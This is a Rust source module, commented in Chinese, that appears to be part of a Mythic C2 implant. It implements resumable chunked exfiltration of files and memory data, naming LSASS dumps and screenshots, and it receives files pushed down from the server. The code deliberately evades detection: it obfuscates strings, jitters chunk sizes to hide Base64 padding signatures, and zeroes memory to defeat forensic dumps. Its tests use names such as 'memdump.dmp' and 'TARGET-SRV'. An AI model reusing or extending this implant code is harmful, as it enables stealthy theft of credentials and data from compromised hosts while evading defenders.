//! # 通用流式传输与断点续传状态机引擎 (Generic Offset Transfer & Resume Engine)
//!
//! ## 架构核心哲学与 100% 零堆纯栈契约 (Zero-Heap OPSEC Architecture)
//!
//! 1. **协议层与业务层解耦 (Decoupled Transfer Engine)**：
//!    - 本模块只专注 Mythic 4.0 纯字节偏移 (Byte-Offset) 传输协议与断点续传状态机逻辑；
//!    - 不包含任何磁盘物理文件特定的字段（路径、截图分类等移至 `crate::file_transfer`）；
//!    - 无论传输磁盘物理文件、纯内存数据切片（如 LSASS dump、屏幕截图原始像素、大任务回显），
//!      均由此引擎统一调度。
//! 2. **纯粹的 Offset 字节偏移协议 (Pure Byte-Offset Protocol)**：
//!    - 彻底废除 Chunk 序号模式，严格基于 0-based 字节偏移量 (`chunk_offset`) 与总字节数 (`total_size`)；
//!    - 支持流式未知长度（负数 `total_size: -1`）与后续动态更新；
//!    - 完整支持 `file_id / transfer_id` + `resume: true` 的标准断点续传握手机制。
//! 3. **统一由 [`StackWorkspace4K`] 纯栈工作面驱动**：
//!    - 调用者提供外包缓冲区 (`&mut StackWorkspace4K`)，底层叶子函数栈帧 < 64 字节，彻底规避 MSVC `__chkstk` 探针；
//!    - 结合 [`Budget4K::jittered_raw_read`] 保证 3 字节倍数向下对齐，消除 Base64 尾部 `=` 填充特征；
//!    - 封包后立即通过 [`zeroize_slice`] volatile 物理刷零明文，防御进程内存转储取证。

use base64::Engine;
use crate::buffer::{encode_to_slice, zeroize_slice};
pub use crate::error::FileTransferError;
use crate::protocol::{
    ActiveBudget, ActiveStackWorkspace, FileDownloadResponse, ServerTaskPostResponseItem,
    TaskResponseItem,
};

// ==========================================
// 1. 多态数据输入源 (Polymorphic Data Source)
// ==========================================

/// 多态数据输入源 (Polymorphic Transfer Source)
///
/// 统一抽象物理磁盘文件句柄与纯内存切片两类数据输入，杜绝两套冗余传输逻辑。
/// 100% 零堆分配，仅持有借用指针。
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub enum TransferSource<'src, R: std::io::Read + std::io::Seek = std::io::Cursor<&'src [u8]>> {
    /// 物理文件句柄或流式 Reader (必须实现 Read + Seek 以支持随机 Offset 定位与断点续传)
    File(&'src mut R),
    /// 内存二进制数据切片 (零拷贝切片借用，如大回显、内存转储、截图切片)
    MemorySlice(&'src [u8]),
}

impl<'src, R: std::io::Read + std::io::Seek> TransferSource<'src, R> {
    /// 创建文件句柄传输源
    #[inline(always)]
    pub fn file(reader: &'src mut R) -> Self {
        Self::File(reader)
    }
}

impl<'src> TransferSource<'src, std::io::Cursor<&'src [u8]>> {
    /// 创建内存切片传输源
    #[inline(always)]
    pub fn slice(slice: &'src [u8]) -> Self {
        Self::MemorySlice(slice)
    }
}

// ==========================================
// 2. 传输前握手注册元数据 (Registration Meta)
// ==========================================

/// 传输前握手注册元数据 (Checkin/Registration Phase Meta)
///
/// 记录本次外发传输载荷的初始声明信息，用于首次向 Mythic 申请 `file_id`。
#[derive(Clone, Copy, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TransferRegisterMeta<'a> {
    /// 预估总字节数 (支持 -1 代表未知长度流式传输)
    pub total_size: i64,
    /// 显示文件名 (如 `Some("dump.bin")`，内存传输可传自定义虚拟名)
    pub filename: Option<&'a str>,
    /// 本地完整路径 (内存传输可传 `None`)
    pub full_path: Option<&'a str>,
    /// 宿主主机名称 (可选，默认由服务端根据回调推导)
    pub host: Option<&'a str>,
    /// 是否作为屏幕截图归档 (若为 true 则 Mythic 自动路由到专有截图查看器)
    pub is_screenshot: bool,
}

impl<'a> TransferRegisterMeta<'a> {
    /// 创建常规文件或内存数据注册元数据
    #[inline]
    pub const fn new(
        total_size: i64,
        filename: Option<&'a str>,
        full_path: Option<&'a str>,
    ) -> Self {
        Self {
            total_size,
            filename,
            full_path,
            host: None,
            is_screenshot: false,
        }
    }

    /// 标记为屏幕截图归档
    #[inline]
    pub const fn with_screenshot(mut self, is_screenshot: bool) -> Self {
        self.is_screenshot = is_screenshot;
        self
    }

    /// 标记来源主机名
    #[inline]
    pub const fn with_host(mut self, host: Option<&'a str>) -> Self {
        self.host = host;
        self
    }
}

// ==========================================
// 3. 通用传输会话状态机 (Generic Transfer Session)
// ==========================================

/// 通用传输会话状态机 (100% 零堆纯栈紧凑布局，仅占约 56 字节)
///
/// 维护单次外发传输从“未注册 -> 握手就绪 -> 字节步进 -> 断点续传 -> 传输完成”的全生命周期。
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TransferSession<'a> {
    /// 触发该外发的任务 UUID (借用)
    pub task_id: &'a str,
    /// Mythic 服务端分配的唯一凭证 UUID (首次注册握手成功后保存为定长 36 字节栈数组)
    pub transfer_id: Option<[u8; 36]>,
    /// 载荷物理总大小 (字节，支持负数如 -1 代表流式未知长度)
    pub total_size: i64,
    /// 当前已发送或服务端要求的起始字节偏移量 (0-based)
    pub current_offset: u64,
    /// 整个传输是否已完成
    pub is_complete: bool,
    /// 本次会话是否经过断点续传恢复
    pub is_resumed: bool,
}

impl<'a> TransferSession<'a> {
    /// 创建新的传输会话实例 (未注册握手状态)
    ///
    /// * `task_id`: 关联的 Mythic Task UUID
    /// * `total_size`: 载荷物理总字节数 (未知可传 -1)
    #[inline]
    pub const fn new(task_id: &'a str, total_size: i64) -> Self {
        Self {
            task_id,
            transfer_id: None,
            total_size,
            current_offset: 0,
            is_complete: total_size == 0,
            is_resumed: false,
        }
    }

    /// 使用已有定长 36 字节 transfer_id 创建会话 (用于从持久化记录或崩溃后恢复断点续传)
    #[inline]
    pub const fn new_with_transfer_id(
        task_id: &'a str,
        total_size: i64,
        transfer_id: [u8; 36],
        current_offset: u64,
    ) -> Self {
        Self {
            task_id,
            transfer_id: Some(transfer_id),
            total_size,
            current_offset,
            is_complete: total_size >= 0 && current_offset >= total_size as u64,
            is_resumed: true,
        }
    }

    /// 提取当前保存的 File/Transfer UUID 字符串切片 (零拷贝 UTF-8 视图)
    #[inline]
    pub fn transfer_id_str(&self) -> Option<&str> {
        self.transfer_id
            .as_ref()
            .and_then(|id| core::str::from_utf8(id).ok())
    }

    /// 动态更新数据总大小 (应对流式生成时最初为 -1，后续得出确定大小的场景)
    #[inline]
    pub fn update_total_size(&mut self, new_size: i64) {
        self.total_size = new_size;
        if new_size >= 0 && self.current_offset >= new_size as u64 {
            self.is_complete = true;
        }
    }

    /// 手动标记会话已传输完成 (适用于未知长度流式传输到达 EOF 的场景)
    #[inline]
    pub fn mark_complete(&mut self) {
        self.is_complete = true;
    }

    // ----------------- 阶段 1: 传输前注册握手 (Checkin / Registration) -----------------

    /// 构造首次向 Mythic 注册传输的请求载荷 (纯 Offset 模式)
    ///
    /// * 对应文档：/message-flow/file-download-agent-greater-than-mythic#register-an-offset-transfer
    #[inline]
    pub fn build_register_payload(&self, meta: TransferRegisterMeta<'a>) -> FileDownloadResponse<'a> {
        FileDownloadResponse::new_offset_register(
            meta.total_size,
            meta.filename,
            meta.full_path,
            meta.host,
            meta.is_screenshot,
        )
    }

    /// 一键构造包装好的注册顶层 TaskResponseItem
    #[inline]
    pub fn build_register_task_response(&self, meta: TransferRegisterMeta<'a>) -> TaskResponseItem<'a> {
        TaskResponseItem {
            task_id: self.task_id,
            download: Some(self.build_register_payload(meta)),
            ..TaskResponseItem::default()
        }
    }

    /// 处理服务端注册确认回执并将 File UUID 安全保存至栈数组 `[u8; 36]`
    ///
    /// 彻底切断对临时解密明文缓冲区的生命周期借用，杜绝堆分配与内存残留。
    pub fn handle_register_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<&str, FileTransferError> {
        if resp.status != obfstr::obfstr!("success") {
            return Err(FileTransferError::ServerStatusError);
        }

        let id_str = resp.file_id.ok_or(FileTransferError::MissingFileId)?;
        let bytes = id_str.as_bytes();
        if bytes.len() != 36 {
            return Err(FileTransferError::MissingFileId);
        }

        let mut arr = [0u8; 36];
        arr.copy_from_slice(bytes);
        self.transfer_id = Some(arr);

        Ok(self.transfer_id_str().unwrap())
    }

    // ----------------- 阶段 2: 异常断点续传握手 (Resume Handshake) -----------------

    /// 构造断点续传 (Resume) 申请报文
    ///
    /// 发送已有 transfer_id + `resume: true` 向服务端询问缺失的首个字节偏移量。
    pub fn build_resume_payload(&self) -> Result<FileDownloadResponse<'_>, FileTransferError> {
        let file_id = self
            .transfer_id_str()
            .ok_or(FileTransferError::MissingFileId)?;
        Ok(FileDownloadResponse::new_resume_request(file_id))
    }

    /// 一键构造包装好的断点续传顶层 TaskResponseItem
    pub fn build_resume_task_response(&self) -> Result<TaskResponseItem<'_>, FileTransferError> {
        let req = self.build_resume_payload()?;
        Ok(TaskResponseItem {
            task_id: self.task_id,
            download: Some(req),
            ..TaskResponseItem::default()
        })
    }

    /// 解析服务端的断点续传确认回执，并校准当前字节读取偏移量 (纯 Offset 模式)
    ///
    /// * 校验服务端下发的 `chunk_offset`，防止越界错误。
    pub fn handle_resume_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        if resp.status != obfstr::obfstr!("success") {
            return Err(FileTransferError::ServerStatusError);
        }

        let new_offset = resp
            .chunk_offset
            .ok_or(FileTransferError::ServerMissingOffset)?;

        if self.total_size >= 0 && new_offset > self.total_size as u64 {
            return Err(FileTransferError::OffsetOutOfBounds);
        }

        self.current_offset = new_offset;
        self.is_resumed = true;
        if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
            self.is_complete = true;
        }

        Ok(self.current_offset)
    }

    // ----------------- 阶段 3: 纯栈数据流泵送 (Stream Pump Engine) -----------------

    /// 核心步进调度器：从多态数据源中提取分片并完成纯栈封包与擦除
    ///
    /// * `source`: 多态数据输入源 (支持 File 与 MemorySlice)
    /// * `workspace`: 调用者提供的纯栈工作区 ([`ActiveStackWorkspace`])，承载 raw_buf 与 b64_buf
    /// * `use_jitter`: 是否启用基于 [`ActiveBudget::jittered_raw_read`] 的动态抖动与 3 字节倍数向下对齐
    ///
    /// 返回 `(FileDownloadResponse, 实际读取消耗的原始字节数)`
    pub fn pump_next_chunk<'buf, 'sess, 'src, R>(
        &'sess mut self,
        source: &mut TransferSource<'src, R>,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: std::io::Read + std::io::Seek,
        'buf: 'sess,
    {
        if self.is_complete {
            return Err(FileTransferError::InvalidState);
        }

        let file_id_bytes = self
            .transfer_id
            .as_ref()
            .ok_or(FileTransferError::MissingFileId)?;
        let file_id = core::str::from_utf8(file_id_bytes)
            .map_err(|_| FileTransferError::MissingFileId)?;

        // 1. 根据 PacketBudget 计算本次读取配额 (保证 3 字节倍数向下对齐，杜绝 Base64 '=' 填充)
        let max_budget = if use_jitter {
            ActiveBudget::jittered_raw_read()
        } else {
            ActiveBudget::MAX_RAW_READ
        };

        // 若总大小已知且非负，读取量不超过剩余未传字节数
        let target_len = if self.total_size >= 0 {
            let remaining_bytes = (self.total_size as u64).saturating_sub(self.current_offset);
            if remaining_bytes == 0 {
                self.is_complete = true;
                return Err(FileTransferError::InvalidState);
            }
            (max_budget as u64).min(remaining_bytes) as usize
        } else {
            max_budget
        };

        // 确保不超过 workspace.raw_buf 的物理容量 (MAX_RAW_LEN = 3072)
        let target_len = target_len.min(workspace.raw_buf.len());

        // 2. 统一从数据源根据 current_offset 读取至 workspace.raw_buf
        let read_bytes = match source {
            TransferSource::File(reader) => {
                reader
                    .seek(std::io::SeekFrom::Start(self.current_offset))
                    .map_err(|_| FileTransferError::IoError)?;
                reader
                    .read(&mut workspace.raw_buf[..target_len])
                    .map_err(|_| FileTransferError::IoError)?
            }
            TransferSource::MemorySlice(slice) => {
                let off = self.current_offset as usize;
                if off >= slice.len() {
                    0
                } else {
                    let available = &slice[off..];
                    let to_copy = target_len.min(available.len());
                    workspace.raw_buf[..to_copy].copy_from_slice(&available[..to_copy]);
                    to_copy
                }
            }
        };

        if read_bytes == 0 {
            // 到达 EOF 或数据源末尾
            self.is_complete = true;
            return Err(FileTransferError::InvalidState);
        }

        // 3. 原地 Base64 编码至 workspace.chunk_buf (与外层封包 b64_buf 严格解耦，零堆分配)
        let encoded_bytes = encode_to_slice(
            &workspace.raw_buf[..read_bytes],
            &mut workspace.chunk_buf,
        )
        .map_err(|_| FileTransferError::Base64Error)?;

        let b64_str = core::str::from_utf8(encoded_bytes)
            .map_err(|_| FileTransferError::Base64Error)?;

        // 4. 【OPSEC】物理擦除暂存的明文原始字节，防御进程内存转储取证
        zeroize_slice(&mut workspace.raw_buf[..read_bytes]);

        // 5. 组装纯 Offset 报文
        let chunk_resp =
            FileDownloadResponse::new_offset_chunk(file_id, self.current_offset, b64_str);

        // 6. 推进偏移量并检查传输完成状态
        self.current_offset = self.current_offset.saturating_add(read_bytes as u64);
        if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
            self.is_complete = true;
        }

        Ok((chunk_resp, read_bytes))
    }

    /// 便捷方法：从实现 `Read + Seek` 的流 (如文件句柄) 中读取分片并封包
    #[inline]
    pub fn pump_file_chunk<'buf, 'sess, R>(
        &'sess mut self,
        reader: &mut R,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: std::io::Read + std::io::Seek,
        'buf: 'sess,
    {
        let mut source = TransferSource::File(reader);
        self.pump_next_chunk(&mut source, workspace, use_jitter)
    }

    /// 便捷方法：从内存切片借用中读取分片并封包 (如大回显、内存转储、截图切片)
    #[inline]
    pub fn pump_slice_chunk<'buf, 'sess>(
        &'sess mut self,
        slice: &[u8],
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        'buf: 'sess,
    {
        let mut source: TransferSource<'_, std::io::Cursor<&[u8]>> =
            TransferSource::MemorySlice(slice);
        self.pump_next_chunk(&mut source, workspace, use_jitter)
    }

    // ----------------- 阶段 4: 服务端单切片 ACK 确认 -----------------

    /// 处理服务端对发送切片的确认响应
    pub fn handle_chunk_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        if resp.status != obfstr::obfstr!("success") {
            return Err(FileTransferError::ServerStatusError);
        }
        Ok(self.current_offset)
    }
}

// ==========================================
// 4. 服务端文件下发接收状态机 (Mythic -> Agent Upload / Download)
// ==========================================

/// 服务端下发文件接收会话 (Mythic -> Agent 文件下发与流式落盘)
///
/// 遵循 Mythic 4.0 官方规范：
/// 1. Agent 任务派发后，发送 `FileUploadRequest { file_id, chunk_size, chunk_num, full_path }`；
/// 2. 服务端在回执中返回带有 `total_chunks`, `chunk_num`, `chunk_data` 的数据切片；
/// 3. 本状态机就地 Base64 解码并流式落盘写入目标 Writer，自动推进分片计数，直至全部写入完成。
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TransferReceiveSession<'a> {
    /// 触发本文件接收的任务 UUID
    pub task_id: &'a str,
    /// 待接收文件的 UUID (定长 36 字节)
    pub file_id: [u8; 36],
    /// 单次请求的分片大小 (字节)
    pub chunk_size: u32,
    /// 目标文件落地完整路径 (可选)
    pub full_path: Option<&'a str>,
    /// 当前期待请求的分片序号 (1-based，从 1 开始)
    pub current_chunk_num: u32,
    /// 服务端通报的总分片数 (初始为 0，收到首片后锁定)
    pub total_chunks: u32,
    /// 已成功写入的累计字节数
    pub received_bytes: u64,
    /// 是否已全部接收完毕
    pub is_complete: bool,
}

impl<'a> TransferReceiveSession<'a> {
    /// 创建新的文件接收会话
    #[inline]
    pub fn new(
        task_id: &'a str,
        file_id_str: &str,
        chunk_size: u32,
        full_path: Option<&'a str>,
    ) -> Result<Self, FileTransferError> {
        if file_id_str.len() != 36 {
            return Err(FileTransferError::InvalidState);
        }
        let mut file_id = [0u8; 36];
        file_id.copy_from_slice(file_id_str.as_bytes());

        Ok(Self {
            task_id,
            file_id,
            chunk_size,
            full_path,
            current_chunk_num: 1,
            total_chunks: 0,
            received_bytes: 0,
            is_complete: false,
        })
    }

    /// 获取当前文件 ID 文本切片
    #[inline(always)]
    pub fn file_id_str(&self) -> &str {
        core::str::from_utf8(&self.file_id).unwrap_or("")
    }

    /// 生成拉取下一个分片的请求报文 (用于挂载在 TaskResponseItem.upload)
    #[inline]
    pub fn build_chunk_request(&self) -> crate::protocol::FileUploadRequest<'_> {
        crate::protocol::FileUploadRequest {
            chunk_size: self.chunk_size,
            file_id: self.file_id_str(),
            chunk_num: self.current_chunk_num,
            full_path: self.full_path,
        }
    }

    /// 生成包含拉取分片请求的通用任务回执项
    #[inline]
    pub fn build_chunk_task_response(&self) -> TaskResponseItem<'_> {
        let mut item = TaskResponseItem::new(self.task_id, "", false);
        item.upload = Some(self.build_chunk_request());
        item
    }

    /// 接收并就地解密服务端下发的分片数据，流式写入目标 Writer (零堆分配)
    ///
    /// * `chunk_data_b64`: 服务端下发的 Base64 数据切片
    /// * `total_chunks`: 服务端下发的总分片数
    /// * `chunk_num`: 本次下发的分片序号
    /// * `raw_buf`: 供 Base64 解码的二进制暂存区
    /// * `writer`: 目标写入流 (如物理文件句柄或内存缓冲区)
    /// * 返回: 本次成功写入的字节数
    pub fn write_incoming_chunk<W: std::io::Write>(
        &mut self,
        chunk_data_b64: &str,
        total_chunks: u32,
        chunk_num: u32,
        raw_buf: &mut [u8],
        writer: &mut W,
    ) -> Result<usize, FileTransferError> {
        if self.is_complete {
            return Err(FileTransferError::InvalidState);
        }
        if chunk_num != self.current_chunk_num {
            return Err(FileTransferError::OffsetMismatch);
        }

        self.total_chunks = total_chunks;

        // 就地 Base64 解码至 raw_buf
        let written = base64::prelude::BASE64_STANDARD
            .decode_slice(chunk_data_b64.as_bytes(), raw_buf)
            .map_err(|_| FileTransferError::Base64Error)?;

        // 流式写入目标句柄
        writer
            .write_all(&raw_buf[..written])
            .map_err(|_| FileTransferError::IoError)?;
        writer.flush().map_err(|_| FileTransferError::IoError)?;

        // 物理刷零明文，防内存分析
        zeroize_slice(&mut raw_buf[..written]);

        self.received_bytes += written as u64;
        self.current_chunk_num += 1;

        if self.current_chunk_num > self.total_chunks {
            self.is_complete = true;
        }

        Ok(written)
    }
}

// ==========================================
// 5. 单元测试 (100% 栈分配与双向传输验证)
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    #[test]
    fn test_transfer_session_lifecycle_and_resume() {
        let mut session = TransferSession::new("task-uuid-generic", 5000);
        assert_eq!(session.total_size, 5000);
        assert!(!session.is_complete);

        // 1. 验证首次注册报文
        let meta = TransferRegisterMeta::new(5000, Some("memdump.dmp"), None)
            .with_host(Some("TARGET-SRV"))
            .with_screenshot(false);

        let reg = session.build_register_payload(meta);
        assert_eq!(reg.total_size, Some(5000));
        assert_eq!(reg.filename, Some("memdump.dmp"));
        assert_eq!(reg.host, Some("TARGET-SRV"));
        assert!(reg.file_id.is_none());

        let task_resp = session.build_register_task_response(meta);
        assert_eq!(task_resp.task_id, "task-uuid-generic");
        assert!(task_resp.download.is_some());

        // 2. 模拟服务端返回注册成功回执 (36 字节 UUID)
        let sample_uuid = "11112222-3333-4444-5555-666677778888";
        let reg_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-generic",
            status: "success",
            file_id: Some(sample_uuid),
            ..Default::default()
        };
        let file_id = session.handle_register_ack(&reg_ack).unwrap();
        assert_eq!(file_id, sample_uuid);
        assert_eq!(session.transfer_id_str(), Some(sample_uuid));

        // 3. 模拟发送第一个切片
        let sample_raw = b"Generic stream test data payload";
        let mut workspace = ActiveStackWorkspace::new();
        {
            let (chunk_resp, sent_bytes) = session
                .pump_slice_chunk(sample_raw, &mut workspace, false)
                .unwrap();

            assert_eq!(sent_bytes, sample_raw.len());
            assert_eq!(chunk_resp.chunk_offset, Some(0));
            assert_eq!(chunk_resp.file_id, Some(sample_uuid));
        }
        assert_eq!(session.current_offset, sample_raw.len() as u64);
        assert!(!session.is_complete);

        // 4. 模拟网络中断，发起断点续传申请
        let resume_req = session.build_resume_payload().unwrap();
        assert_eq!(resume_req.file_id, Some(sample_uuid));
        assert_eq!(resume_req.resume, Some(true));

        // 5. 模拟服务端纯 Offset 回执 (告知从偏移量 2048 恢复)
        let resume_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-generic",
            status: "success",
            file_id: Some(sample_uuid),
            chunk_offset: Some(2048),
            transfer_type: Some("offset"),
            total_size: Some(5000),
            ..Default::default()
        };
        let resumed_offset = session.handle_resume_ack(&resume_ack).unwrap();
        assert_eq!(resumed_offset, 2048);
        assert_eq!(session.current_offset, 2048);
        assert!(session.is_resumed);
    }

    #[test]
    fn test_transfer_session_file_pump_with_jitter() {
        let mut fake_file_data = alloc::vec![0u8; 100_000];
        for (i, b) in fake_file_data.iter_mut().enumerate() {
            *b = (i % 256) as u8;
        }
        let total_size = fake_file_data.len() as i64;
        let mut cursor = Cursor::new(&mut fake_file_data[..]);

        let sample_uuid = "abcdef01-2345-6789-abcd-ef0123456789";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());

        let mut session =
            TransferSession::new_with_transfer_id("task-jitter", total_size, uuid_arr, 0);

        let mut workspace = ActiveStackWorkspace::new();

        // 第 1 轮分片读取 (开启 Jitter)
        let (chunk1, bytes1) = session
            .pump_file_chunk(&mut cursor, &mut workspace, true)
            .unwrap();
        assert_eq!(chunk1.chunk_offset, Some(0));
        assert!(bytes1 >= ActiveBudget::min_raw_read());
        assert_eq!(bytes1 % 3, 0); // 严格 3 字节倍数对齐
        assert_eq!(session.current_offset, bytes1 as u64);

        // 持续读取直至完成
        while !session.is_complete {
            let (chunk, read_len) = session
                .pump_file_chunk(&mut cursor, &mut workspace, true)
                .unwrap();
            assert!(read_len > 0);
            assert!(chunk.chunk_data.is_some());
            assert!(chunk.chunk_offset.is_some());
        }

        assert_eq!(session.current_offset, total_size as u64);
        assert!(session.is_complete);
    }

    #[test]
    fn test_transfer_session_streaming_and_update() {
        let mut session = TransferSession::new("task-stream", -1);
        assert_eq!(session.total_size, -1);
        assert!(!session.is_complete);

        let sample_uuid = "99999999-8888-7777-6666-555555555555";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());
        session.transfer_id = Some(uuid_arr);

        let chunk1_bytes = [0x55u8; 600];
        let mut workspace = ActiveStackWorkspace::new();
        let (resp1, sent1) = session
            .pump_slice_chunk(&chunk1_bytes, &mut workspace, false)
            .unwrap();
        assert_eq!(sent1, 600);
        assert_eq!(resp1.chunk_offset, Some(0));
        assert_eq!(session.current_offset, 600);
        assert!(!session.is_complete);

        // 流式传输完毕，动态更新并锁定总大小为 600
        session.update_total_size(600);
        assert!(session.is_complete);
    }

    #[test]
    fn test_transfer_receive_session_lifecycle() {
        let file_uuid = "22223333-4444-5555-6666-777788889999";
        let mut recv_sess = TransferReceiveSession::new(
            "task-upload-001",
            file_uuid,
            512,
            Some("C:\\Temp\\tool.exe"),
        )
        .unwrap();

        assert_eq!(recv_sess.current_chunk_num, 1);
        assert!(!recv_sess.is_complete);

        // 1. 构建第 1 片拉取请求
        let req1 = recv_sess.build_chunk_request();
        assert_eq!(req1.chunk_num, 1);
        assert_eq!(req1.chunk_size, 512);
        assert_eq!(req1.file_id, file_uuid);

        // 2. 模拟服务端下发第 1 片数据 Base64 ("Hello, World! Chunk 1")
        let chunk1_raw = b"Hello, World! Chunk 1";
        let mut b64_buf = [0u8; 128];
        let b64_len = base64::prelude::BASE64_STANDARD
            .encode_slice(chunk1_raw, &mut b64_buf)
            .unwrap();
        let chunk1_b64 = core::str::from_utf8(&b64_buf[..b64_len]).unwrap();

        let mut received_file_data = Vec::new();
        let mut raw_buf = [0u8; 1024];

        let written = recv_sess
            .write_incoming_chunk(chunk1_b64, 2, 1, &mut raw_buf, &mut received_file_data)
            .unwrap();
        assert_eq!(written, chunk1_raw.len());
        assert_eq!(recv_sess.current_chunk_num, 2);
        assert!(!recv_sess.is_complete);

        // 3. 模拟服务端下发第 2 片数据并收尾
        let chunk2_raw = b"Hello, World! Chunk 2 (EOF)";
        let b64_len2 = base64::prelude::BASE64_STANDARD
            .encode_slice(chunk2_raw, &mut b64_buf)
            .unwrap();
        let chunk2_b64 = core::str::from_utf8(&b64_buf[..b64_len2]).unwrap();

        let written2 = recv_sess
            .write_incoming_chunk(chunk2_b64, 2, 2, &mut raw_buf, &mut received_file_data)
            .unwrap();
        assert_eq!(written2, chunk2_raw.len());
        assert_eq!(recv_sess.current_chunk_num, 3);
        assert!(recv_sess.is_complete);

        assert_eq!(
            received_file_data,
            b"Hello, World! Chunk 1Hello, World! Chunk 2 (EOF)"
        );
    }
}
